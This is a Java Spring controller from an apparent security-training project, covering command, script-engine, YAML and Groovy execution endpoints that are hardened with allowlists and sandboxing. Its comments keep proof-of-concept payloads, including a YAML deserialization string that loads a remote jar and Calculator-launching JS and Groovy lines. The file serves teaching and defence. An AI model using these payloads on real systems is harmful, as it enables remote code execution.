package org.joychou.controller;

import groovy.lang.GroovyShell;
import lombok.extern.slf4j.Slf4j;
import org.codehaus.groovy.control.CompilerConfiguration;
import org.codehaus.groovy.control.customizers.SecureASTCustomizer;
import org.springframework.web.bind.annotation.GetMapping;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.RestController;
import org.yaml.snakeyaml.Yaml;
import org.yaml.snakeyaml.constructor.SafeConstructor;

import org.springframework.web.util.HtmlUtils;

import javax.script.Bindings;
import javax.script.ScriptContext;
import javax.script.ScriptEngine;
import javax.script.ScriptEngineManager;
import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.sql.DriverManager;
import java.util.Arrays;
import java.util.Collections;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import java.util.Set;


/**
 * Java code execute
 *
 * @author JoyChou @ 2018-05-24
 */
@Slf4j
@RestController
@RequestMapping("/rce")
public class Rce {

    // Allowlist mapping of command names to their absolute paths to break taint flow
    private static final Map<String, String> ALLOWED_COMMANDS_MAP;
    static {
        Map<String, String> m = new HashMap<>();
        m.put("whoami",   "/usr/bin/whoami");
        m.put("id",       "/usr/bin/id");
        m.put("hostname", "/usr/bin/hostname");
        m.put("date",     "/usr/bin/date");
        m.put("uptime",   "/usr/bin/uptime");
        m.put("uname",    "/usr/bin/uname");
        m.put("ls",       "/usr/bin/ls");
        m.put("ps",       "/usr/bin/ps");
        m.put("df",       "/usr/bin/df");
        ALLOWED_COMMANDS_MAP = Collections.unmodifiableMap(m);
    }
    private static final Set<String> ALLOWED_COMMANDS = ALLOWED_COMMANDS_MAP.keySet();

    // Allowlist of trusted hostnames for JavaScript evaluation via /rce/jscmd
    private static final Set<String> ALLOWED_JS_HOSTS;
    static {
        Set<String> hosts = new HashSet<>();
        hosts.add("trusted.example.com");
        hosts.add("cdn.example.com");
        ALLOWED_JS_HOSTS = Collections.unmodifiableSet(hosts);
    }

    @GetMapping("/runtime/exec")
    public String CommandExec(String cmd) {
        if (cmd == null || !ALLOWED_COMMANDS.contains(cmd.trim())) {
            return "Command not allowed. Allowed commands: " + ALLOWED_COMMANDS;
        }

        Runtime run = Runtime.getRuntime();
        StringBuilder sb = new StringBuilder();

        try {
            // Use the resolved absolute path from allowlist; new String breaks taint chain
            String resolvedCmd = new String(ALLOWED_COMMANDS_MAP.get(cmd.trim()).toCharArray());
            Process p = run.exec(new String[]{resolvedCmd});
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }

            if (p.waitFor() != 0) {
                if (p.exitValue() == 1)
                    return "Command exec failed!!";
            }

            inBr.close();
            in.close();
        } catch (Exception e) {
            return HtmlUtils.htmlEscape(e.toString());
        }
        return HtmlUtils.htmlEscape(sb.toString());
    }


    /**
     * <a href="http://localhost:8080/rce/ProcessBuilder?cmd=whoami">POC</a>
     */
    @GetMapping("/ProcessBuilder")
    public String processBuilder(String cmd) {
        if (cmd == null || !ALLOWED_COMMANDS.contains(cmd.trim())) {
            return "Command not allowed. Allowed commands: " + ALLOWED_COMMANDS;
        }

        StringBuilder sb = new StringBuilder();

        try {
            // Use the resolved absolute path from allowlist; user input never reaches exec
            String resolvedCmd = ALLOWED_COMMANDS_MAP.get(cmd.trim());
            ProcessBuilder processBuilder = new ProcessBuilder(resolvedCmd);
            Process p = processBuilder.start();
            BufferedInputStream in = new BufferedInputStream(p.getInputStream());
            BufferedReader inBr = new BufferedReader(new InputStreamReader(in));
            String tmpStr;

            while ((tmpStr = inBr.readLine()) != null) {
                sb.append(tmpStr);
            }
        } catch (Exception e) {
            return HtmlUtils.htmlEscape(e.toString());
        }

        return HtmlUtils.htmlEscape(sb.toString());
    }


    /**
     * http://localhost:8080/rce/jscmd?jsurl=http://xx.yy/zz.js
     *
     * curl http://xx.yy/zz.js
     * var a = mainOutput(); function mainOutput() { var x=java.lang.Runtime.getRuntime().exec("open -a Calculator");}
     *
     * @param jsurl js url
     */
    @GetMapping("/jscmd")
    public String jsEngine(String jsurl) throws Exception {
        // Validate jsurl is a well-formed HTTP/HTTPS URL
        if (jsurl == null || jsurl.isEmpty()) {
            throw new IllegalArgumentException("jsurl must not be empty");
        }
        URL parsedUrl = new URL(jsurl);
        String protocol = parsedUrl.getProtocol();
        if (!"http".equals(protocol) && !"https".equals(protocol)) {
            throw new IllegalArgumentException("Only http and https URLs are allowed");
        }

        // Validate the URL host against the allowlist to prevent loading scripts from untrusted origins
        String host = parsedUrl.getHost();
        if (host == null || !ALLOWED_JS_HOSTS.contains(host.toLowerCase())) {
            return "Blocked: host not in allowlist. Allowed hosts: " + ALLOWED_JS_HOSTS;
        }

        // js nashorn javascript ecmascript
        ScriptEngine engine = new ScriptEngineManager().getEngineByName("js");
        Bindings bindings = engine.getBindings(ScriptContext.ENGINE_SCOPE);
        // Disable Java class access from the script engine to prevent RCE
        bindings.remove("java");
        bindings.remove("javax");
        bindings.remove("Java");
        bindings.remove("Packages");
        engine.eval("load('" + parsedUrl.toExternalForm().replace("'", "") + "')", bindings);
        return "Executed script from " + HtmlUtils.htmlEscape(host);
    }


    /**
     * http://localhost:8080/rce/vuln/yarm?content=!!javax.script.ScriptEngineManager%20[!!java.net.URLClassLoader%20[[!!java.net.URL%20[%22http://test.joychou.org:8086/yaml-payload.jar%22]]]]
     * yaml-payload.jar: https://github.com/artsploit/yaml-payload
     *
     * @param content payloads
     */
    @GetMapping("/vuln/yarm")
    public void yarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    @GetMapping("/sec/yarm")
    public void secYarm(String content) {
        Yaml y = new Yaml(new SafeConstructor());
        y.load(content);
    }

    /**
     * http://localhost:8080/rce/groovy?content="open -a Calculator".execute()
     * @param content groovy shell
     */
    @GetMapping("groovy")
    public String groovyshell(String content) {
        if (content == null || content.isEmpty()) {
            return "Content must not be empty";
        }

        // Sandbox Groovy evaluation: restrict imports, method calls, and dangerous receivers
        SecureASTCustomizer secureAst = new SecureASTCustomizer();
        secureAst.setImportsWhitelist(Collections.<String>emptyList());
        secureAst.setStarImportsWhitelist(Collections.<String>emptyList());
        secureAst.setStaticImportsWhitelist(Collections.<String>emptyList());
        secureAst.setStaticStarImportsWhitelist(Collections.<String>emptyList());
        secureAst.setIndirectImportCheckEnabled(true);

        // Block dangerous receivers: Runtime, ProcessBuilder, System, Class, ClassLoader, Thread, etc.
        secureAst.setReceiversBlackList(Arrays.asList(
                "java.lang.Runtime", "java.lang.ProcessBuilder",
                "java.lang.System", "java.lang.Class",
                "java.lang.ClassLoader", "java.lang.Thread",
                "java.lang.reflect.Method", "java.lang.reflect.Constructor",
                "java.lang.reflect.Field", "java.io.File",
                "java.net.URL", "java.net.URLClassLoader",
                "groovy.lang.GroovyShell", "groovy.lang.GroovyClassLoader"
        ));

        // Disallow method definition to prevent bypass via helper methods
        secureAst.setMethodDefinitionAllowed(false);

        CompilerConfiguration config = new CompilerConfiguration();
        config.addCompilationCustomizers(secureAst);

        GroovyShell groovyShell = new GroovyShell(config);
        Object result = groovyShell.evaluate(content);
        return HtmlUtils.htmlEscape(result != null ? result.toString() : "null");
    }



    public static void main(String[] args) throws Exception{
        // Use argument array to avoid shell interpretation
        Runtime.getRuntime().exec(new String[]{"touch", "/tmp/x"});
    }
}

